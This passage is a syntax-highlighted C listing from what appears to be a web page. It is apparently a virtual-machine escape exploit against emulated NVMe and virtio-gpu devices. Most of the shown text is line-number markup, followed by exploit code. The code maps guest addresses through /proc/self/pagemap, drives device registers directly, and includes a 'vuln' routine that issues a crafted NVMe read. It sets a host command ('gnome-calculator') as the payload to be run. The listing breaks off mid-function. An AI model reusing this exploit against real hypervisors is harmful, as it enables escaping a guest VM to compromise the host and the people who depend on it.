class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> *mmio_nvme;<br><span class="hljs-type">void</span> *mmio_gpu;<br><span class="hljs-type">void</span> *buf;<br><span class="hljs-type">void</span> *nvme_buf;<br><span class="hljs-type">void</span> *desc_buf;<br><span class="hljs-type">size_t</span> *payload_buf;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VRingDesc</span> *<span class="hljs-title">desc</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VRingAvail</span> *<span class="hljs-title">avail</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">NvmeCmd</span> *<span class="hljs-title">nvme_cmd</span>;</span> <br><span class="hljs-type">int</span> sq_tail = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> vq_last_avail_idx = <span class="hljs-number">0</span>;<br><span class="hljs-type">char</span> exec_cmd[<span class="hljs-number">0x40</span>] = <span class="hljs-string">&quot;gnome-calculator&quot;</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">NvmeCmd</span> &#123;</span><br>    <span class="hljs-type">uint8_t</span>     opcode;<br>    <span class="hljs-type">uint8_t</span>     fuse;<br>    <span class="hljs-type">uint16_t</span>    cid;<br>    <span class="hljs-type">uint32_t</span>    nsid;<br>    <span class="hljs-type">uint64_t</span>    res1;<br>    <span class="hljs-type">uint64_t</span>    mptr;<br>    <span class="hljs-type">uint64_t</span>    prp1;<br>    <span class="hljs-type">uint64_t</span>    prp2;<br>    <span class="hljs-type">uint32_t</span>    cdw10;<br>    <span class="hljs-type">uint32_t</span>    cdw11;<br>    <span class="hljs-type">uint32_t</span>    cdw12;<br>    <span class="hljs-type">uint32_t</span>    cdw13;<br>    <span class="hljs-type">uint32_t</span>    cdw14;<br>    <span class="hljs-type">uint32_t</span>    cdw15;<br>&#125; NvmeCmd;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">NvmeCreateCq</span> &#123;</span><br>    <span class="hljs-type">uint8_t</span>     opcode;<br>    <span class="hljs-type">uint8_t</span>     flags;<br>    <span class="hljs-type">uint16_t</span>    cid;<br>    <span class="hljs-type">uint32_t</span>    rsvd1[<span class="hljs-number">5</span>];<br>    <span class="hljs-type">uint64_t</span>    prp1;<br>    <span class="hljs-type">uint64_t</span>    rsvd8;<br>    <span class="hljs-type">uint16_t</span>    cqid;<br>    <span class="hljs-type">uint16_t</span>    qsize;<br>    <span class="hljs-type">uint16_t</span>    cq_flags;<br>    <span class="hljs-type">uint16_t</span>    irq_vector;<br>    <span class="hljs-type">uint32_t</span>    rsvd12[<span class="hljs-number">4</span>];<br>&#125; NvmeCreateCq;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">NvmeCreateSq</span> &#123;</span><br>    <span class="hljs-type">uint8_t</span>     opcode;<br>    <span class="hljs-type">uint8_t</span>     flags;<br>    <span class="hljs-type">uint16_t</span>    cid;<br>    <span class="hljs-type">uint32_t</span>    rsvd1[<span class="hljs-number">5</span>];<br>    <span class="hljs-type">uint64_t</span>    prp1;<br>    <span class="hljs-type">uint64_t</span>    rsvd8;<br>    <span class="hljs-type">uint16_t</span>    sqid;<br>    <span class="hljs-type">uint16_t</span>    qsize;<br>    <span class="hljs-type">uint16_t</span>    sq_flags;<br>    <span class="hljs-type">uint16_t</span>    cqid;<br>    <span class="hljs-type">uint32_t</span>    rsvd12[<span class="hljs-number">4</span>];<br>&#125; NvmeCreateSq;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">NvmeRwCmd</span> &#123;</span><br>    <span class="hljs-type">uint8_t</span>     opcode;<br>    <span class="hljs-type">uint8_t</span>     flags;<br>    <span class="hljs-type">uint16_t</span>    cid;<br>    <span class="hljs-type">uint32_t</span>    nsid;<br>    <span class="hljs-type">uint64_t</span>    rsvd2;<br>    <span class="hljs-type">uint64_t</span>    mptr;<br>    <span class="hljs-type">uint64_t</span>    prp1;<br>    <span class="hljs-type">uint64_t</span>    prp2;<br>    <span class="hljs-type">uint64_t</span>    slba;<br>    <span class="hljs-type">uint16_t</span>    nlb;<br>    <span class="hljs-type">uint16_t</span>    control;<br>    <span class="hljs-type">uint32_t</span>    dsmgmt;<br>    <span class="hljs-type">uint32_t</span>    reftag;<br>    <span class="hljs-type">uint16_t</span>    apptag;<br>    <span class="hljs-type">uint16_t</span>    appmask;<br>&#125; NvmeRwCmd;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">NvmeDeleteQ</span> &#123;</span><br>    <span class="hljs-type">uint8_t</span>     opcode;<br>    <span class="hljs-type">uint8_t</span>     flags;<br>    <span class="hljs-type">uint16_t</span>    cid;<br>    <span class="hljs-type">uint32_t</span>    rsvd1[<span class="hljs-number">9</span>];<br>    <span class="hljs-type">uint16_t</span>    qid;<br>    <span class="hljs-type">uint16_t</span>    rsvd10;<br>    <span class="hljs-type">uint32_t</span>    rsvd11[<span class="hljs-number">5</span>];<br>&#125; NvmeDeleteQ;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VRingAvail</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">uint16_t</span> flags;<br>  <span class="hljs-type">uint16_t</span> idx;<br>  <span class="hljs-type">uint16_t</span> ring[];<br>&#125;VRingAvail;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VRingDesc</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span> addr;<br>    <span class="hljs-type">uint32_t</span> len;<br>    <span class="hljs-type">uint16_t</span> flags;<br>    <span class="hljs-type">uint16_t</span> next;<br>&#125; VRingDesc;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_ctrl_hdr</span> &#123;</span><br><span class="hljs-type">uint32_t</span> type;<br><span class="hljs-type">uint32_t</span> flags;<br><span class="hljs-type">uint64_t</span> fence_id;<br><span class="hljs-type">uint32_t</span> ctx_id;<br><span class="hljs-type">uint32_t</span> padding;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_attach_backing</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_ctrl_hdr</span> <span class="hljs-title">hdr</span>;</span><br><span class="hljs-type">uint32_t</span> resource_id;<br><span class="hljs-type">uint32_t</span> nr_entries;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_create_2d</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_ctrl_hdr</span> <span class="hljs-title">hdr</span>;</span><br><span class="hljs-type">uint32_t</span> resource_id;<br><span class="hljs-type">uint32_t</span> format;<br><span class="hljs-type">uint32_t</span> width;<br><span class="hljs-type">uint32_t</span> height;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_mem_entry</span> &#123;</span><br><span class="hljs-type">uint64_t</span> addr;<br><span class="hljs-type">uint32_t</span> length;<br><span class="hljs-type">uint32_t</span> padding;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">NvmeAdminCommands</span> &#123;</span><br>    NVME_ADM_CMD_DELETE_SQ      = <span class="hljs-number">0x00</span>,<br>    NVME_ADM_CMD_CREATE_SQ      = <span class="hljs-number">0x01</span>,<br>    NVME_ADM_CMD_GET_LOG_PAGE   = <span class="hljs-number">0x02</span>,<br>    NVME_ADM_CMD_DELETE_CQ      = <span class="hljs-number">0x04</span>,<br>    NVME_ADM_CMD_CREATE_CQ      = <span class="hljs-number">0x05</span>,<br>    NVME_ADM_CMD_IDENTIFY       = <span class="hljs-number">0x06</span>,<br>    NVME_ADM_CMD_ABORT          = <span class="hljs-number">0x08</span>,<br>    NVME_ADM_CMD_SET_FEATURES   = <span class="hljs-number">0x09</span>,<br>    NVME_ADM_CMD_GET_FEATURES   = <span class="hljs-number">0x0a</span>,<br>    NVME_ADM_CMD_ASYNC_EV_REQ   = <span class="hljs-number">0x0c</span>,<br>    NVME_ADM_CMD_ACTIVATE_FW    = <span class="hljs-number">0x10</span>,<br>    NVME_ADM_CMD_DOWNLOAD_FW    = <span class="hljs-number">0x11</span>,<br>    NVME_ADM_CMD_FORMAT_NVM     = <span class="hljs-number">0x80</span>,<br>    NVME_ADM_CMD_SECURITY_SEND  = <span class="hljs-number">0x81</span>,<br>    NVME_ADM_CMD_SECURITY_RECV  = <span class="hljs-number">0x82</span>,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">NvmeIoCommands</span> &#123;</span><br>    NVME_CMD_FLUSH              = <span class="hljs-number">0x00</span>,<br>    NVME_CMD_WRITE              = <span class="hljs-number">0x01</span>,<br>    NVME_CMD_READ               = <span class="hljs-number">0x02</span>,<br>    NVME_CMD_WRITE_UNCOR        = <span class="hljs-number">0x04</span>,<br>    NVME_CMD_COMPARE            = <span class="hljs-number">0x05</span>,<br>    NVME_CMD_WRITE_ZEROS        = <span class="hljs-number">0x08</span>,<br>    NVME_CMD_DSM                = <span class="hljs-number">0x09</span>,<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_STATUS20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_SELECT22</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_SIZE24</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_ENABLE28</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_DESCLO32</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_DESCHI36</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_AVAILLO40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_AVAILHI44</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VRING_DESC_F_NEXT       1</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_GPU_CMD_RESOURCE_CREATE_2D       0x101</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_GPU_CMD_RESOURCE_DETACH_BACKING  0x106</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SHIFT  12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">page_offset</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span><br>&#123;<br>    <span class="hljs-comment">// addr &amp; 0xfff</span><br>    <span class="hljs-keyword">return</span> addr &amp; ((<span class="hljs-number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gfn</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> pme, gfn;<br>    <span class="hljs-type">size_t</span> offset;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;open&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    offset = ((<span class="hljs-type">uintptr_t</span>)addr &gt;&gt; <span class="hljs-number">9</span>) &amp; ~<span class="hljs-number">7</span>;<br>    lseek(fd, offset, SEEK_SET);<br>    read(fd, &amp;pme, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (!(pme &amp; PFN_PRESENT))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    gfn = pme &amp; PFN_PFN;<br>    close(fd);<br>    <span class="hljs-keyword">return</span> gfn;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gpa</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> gfn = gva_to_gfn(addr);<br>    assert(gfn != <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="hljs-type">uint64_t</span>)addr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_nvme_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> val)</span>&#123;    <br>    *(<span class="hljs-type">uint32_t</span>*)(mmio_nvme + addr) = val;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_gpu_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> val)</span>&#123;    <br>    *(<span class="hljs-type">uint32_t</span>*)(mmio_gpu + addr) = val;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_nvme</span><span class="hljs-params">()</span> &#123;<br>    mmio_nvme_write(<span class="hljs-number">0x14</span>, <span class="hljs-number">0</span>);<span class="hljs-comment">// nvme_clear_ctrl</span><br>    mmio_nvme_write(<span class="hljs-number">0x24</span>, <span class="hljs-number">0xff00ff</span>);         <span class="hljs-comment">// n-&gt;bar.aqa</span><br>mmio_nvme_write(<span class="hljs-number">0x28</span>, gva_to_gpa(nvme_cmd));<br>mmio_nvme_write(<span class="hljs-number">0x2c</span>, gva_to_gpa(nvme_cmd) &gt;&gt; <span class="hljs-number">32</span>);<br><br><span class="hljs-type">uint32_t</span> data = <span class="hljs-number">1</span>;<br>data |= <span class="hljs-number">6</span> &lt;&lt; <span class="hljs-number">16</span>;<span class="hljs-comment">//  sqes</span><br>data |= <span class="hljs-number">4</span> &lt;&lt; <span class="hljs-number">20</span>;<span class="hljs-comment">//cqes</span><br>mmio_nvme_write(<span class="hljs-number">0x14</span>, data);<span class="hljs-comment">// nvme_start_ctrl</span><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">nvme_inc_sq_head</span><span class="hljs-params">()</span>&#123;<br>    sq_tail = sq_tail + <span class="hljs-number">1</span>;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">nvme_create_cq</span><span class="hljs-params">(<span class="hljs-type">int</span> cqid)</span>&#123;<br>    nvme_cmd[sq_tail].opcode = NVME_ADM_CMD_CREATE_CQ;<br>    nvme_cmd[sq_tail].prp1 = gva_to_gpa(nvme_buf);<br><br>    NvmeCreateCq *nvme_create = (NvmeCreateCq *)(nvme_cmd + sq_tail);<br>    nvme_create-&gt;cqid = cqid;<br>    nvme_create-&gt;irq_vector = <span class="hljs-number">1</span>;<br>    nvme_create-&gt;cq_flags = <span class="hljs-number">1</span>;<br>    nvme_create-&gt;qsize = <span class="hljs-number">1</span>;<br>    nvme_inc_sq_head();<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">nvme_create_sq</span><span class="hljs-params">(<span class="hljs-type">int</span> sqid, <span class="hljs-type">int</span> qsize)</span>&#123;<br>    <br>    nvme_cmd[sq_tail].opcode = NVME_ADM_CMD_CREATE_SQ;<br>    nvme_cmd[sq_tail].prp1 = gva_to_gpa(nvme_buf);<br>    <br>    NvmeCreateSq *nvme_create = (NvmeCreateSq *)(nvme_cmd + sq_tail);<br>    nvme_create-&gt;cqid = <span class="hljs-number">1</span>;<br>    nvme_create-&gt;sqid = sqid;<br>    nvme_create-&gt;sq_flags = <span class="hljs-number">1</span>;<br>    nvme_create-&gt;qsize = qsize;<br>    nvme_inc_sq_head();<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">nvme_del_sq</span><span class="hljs-params">(<span class="hljs-type">int</span> sqid)</span>&#123;<br>    nvme_cmd[sq_tail].opcode = NVME_ADM_CMD_DELETE_SQ;<br>    NvmeCreateSq *nvme_del = (NvmeCreateSq *)(nvme_cmd + sq_tail);<br>    nvme_del-&gt;sqid = sqid;<br>    nvme_inc_sq_head();<br>    mmio_nvme_write(<span class="hljs-number">0x1000</span>, sq_tail);<br>    sleep(<span class="hljs-number">0.5</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">(<span class="hljs-type">int</span> sqid)</span>&#123;<br>    <span class="hljs-built_in">memset</span>(nvme_buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> NvmeCmd));<br>    nvme_cmd[<span class="hljs-number">0</span>].opcode = NVME_CMD_READ;<br>    nvme_cmd[<span class="hljs-number">0</span>].prp1 = <span class="hljs-number">0xfe000000</span> + <span class="hljs-number">0xc00</span>;<br>    nvme_cmd[<span class="hljs-number">0</span>].nsid = <span class="hljs-number">1</span>;<br>    NvmeRwCmd *rwcmd = (NvmeRwCmd *)(nvme_cmd);<br>    rwcmd-&gt;nlb = <span class="hljs-number">7</span>;<br>    rwcmd-&gt;slba = <span class="hljs-number">1</span>;<br>    mmio_nvme_write(<span class="hljs-number">0x1000</span> + sqid * <span class="hljs-number">8</span>, <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_gpu</span><span class="hljs-params">()</span>&#123;<br>    mmio_gpu_write(VIRTIO_PCI_COMMON_STATUS, <span class="hljs-number">0</span>);<br>    mmio_gpu_write(VIRTIO_PCI_COMMON_Q_SELECT, <span class="hljs-number">0</span>);<br>    mmio_gpu_write(VIRTIO_PCI_COMMON_Q_SIZE, <span class="hljs-number">0x100</span>);<br>    mmio_gpu_write(VIRTIO_PCI_COMMON_Q_DESCLO, gva_to_gpa(desc));<br>    mmio_gpu_write(VIRTIO_PCI_COMMON_Q_DESCHI, <span class="hljs-number">0</span>);<br>    mmio_gpu_write(VIRTIO_PCI_COMMON_Q_AVAILLO, gva_to_gpa(avail));<br>    mmio_gpu_write(VIRTIO_PCI_COMMON_Q_AVAILHI, <span class="hljs-number">0</span>);<br>    mmio_gpu_write(VIRTIO_PCI_COMMON_Q_ENABLE, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_mapping_table</span><span class="hljs-params">()</span>&#123;<br>    avail-&gt;idx = <span class="hljs-number">2</span>;<br>    avail-&gt;ring[vq_last_avail_idx ++] = <span class="hljs-number">0</span>;<br>    avail-&gt;ring[vq_last_avail_idx ++] = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_create_2d</span> *<span class="hljs-title">c2d</span> =</span> buf + <span class="hljs-number">0x100</span>;<br>    c2d-&gt;hdr.type = VIRTIO_GPU_CMD_RESOURCE_CREATE_2D;<br>    c2d-&gt;resource_id = <span class="hljs-number">1</span>;<br>    c2d-&gt;format = <span class="hljs-number">1</span>;<br>    c2d-&gt;width = <span class="hljs-number">0x100</span>;<br>    c2d-&gt;height = <span class="hljs-number">0x100</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_attach_backing</span> *<span class="hljs-title">ab</span> =</span> buf + <span class="hljs-number">0x200</span>;<br>    ab-&gt;hdr.type = VIRTIO_GPU_CMD_RESOURCE_DETACH_BACKING;<br>    ab-&gt;resource_id = <span class="hljs-number">1</span>;<br>    ab-&gt;nr_entries = <span 